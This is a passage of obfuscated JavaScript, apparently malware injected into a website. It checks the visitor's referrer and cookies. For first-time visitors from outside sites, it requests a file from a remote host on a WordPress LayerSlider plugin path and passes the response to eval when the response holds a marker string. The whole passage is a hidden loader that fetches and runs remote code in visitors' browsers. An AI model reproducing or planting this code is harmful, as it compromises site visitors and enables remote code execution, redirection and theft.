_0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};